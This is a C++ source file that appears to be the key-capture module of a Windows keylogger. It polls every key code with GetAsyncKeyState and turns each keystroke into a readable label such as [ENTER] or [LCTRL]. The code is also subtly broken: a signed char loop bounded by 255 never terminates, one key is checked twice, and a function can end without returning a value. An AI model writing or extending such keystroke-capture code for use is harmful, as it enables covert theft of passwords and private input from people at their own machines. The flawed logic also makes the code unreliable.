#include "stdafx.h"
#include "keys.h"

string keys::save(char & _key) {
	Sleep(10);

	if (_key == VK_LBUTTON)
		return  "[LEFTBUTTON]";
	else if (_key == VK_RBUTTON)
		return  "[RIGHTBUTTON]";
	else if (_key == VK_MBUTTON)
		return  "[MIDDLEBUTTON]";
	else if (_key == VK_RETURN)
		return  "[ENTER]";
	else if (_key == VK_ESCAPE)
		return  "[ESC]";
	else if (_key == VK_TAB)
		return  "[TAB]";
	else if (_key == VK_BACK)
		return  "[BACKSPACE]";
	else if (_key == VK_LCONTROL)
		return  "[LCTRL]";
	else if (_key == VK_RCONTROL)
		return  "[RCTRL]";
	else if (_key == VK_SPACE)
		return  "[SPACE]";
	else if (_key == VK_F1)
		return  "[F1]";
	else if (_key == VK_F2)
		return  "[F2]";
	else if (_key == VK_F3)
		return  "[F3]";
	else if (_key == VK_F4)
		return  "[F4]";
	else if (_key == VK_F5)
		return  "[F5]";
	else if (_key == VK_F6)
		return  "[F6]";
	else if (_key == VK_F7)
		return  "[F7]";
	else if (_key == VK_F8)
		return  "[F8]";
	else if (_key == VK_F9)
		return  "[F9]";
	else if (_key == VK_F10)
		return  "[F10]";
	else if (_key == VK_F11)
		return  "[F11]";
	else if (_key == VK_F12)
		return  "[F12]";
	else if (_key == VK_CAPITAL)
		return  "[CAPSLOCK]";
	else if (_key == VK_RSHIFT)
		return  "[RSHIFT]";
	else if (_key == VK_LSHIFT)
		return  "[LSHIFT]";
	else if (_key == VK_HOME)
		return  "[HOME]";
	else if (_key == VK_INSERT)
		return  "[INSERT]";
	else if (_key == VK_UP)
		return  "[UP]";
	else if (_key == VK_DOWN)
		return  "[DOWN]";
	else if (_key == VK_DELETE)
		return  "[DELETE]";
	else if (_key == VK_CONTROL)
		return  "[CONTROL]";
	else if (_key == VK_BACK)
		return  "[BACK]";
	else {
		char key_pressed = char(_key);
		string a(1, key_pressed);
		return a;
	}
}

string keys::logger(int type) {
	char i;
	Sleep(10);
	if (type == 1) {
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				return save(i);
			}
		}

		return "[NONE]";
	}
	else if (type == 2) { // down
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) & 0x8000) {
				return save(i);
			}
		}

		return "[NONE]";
	}
}
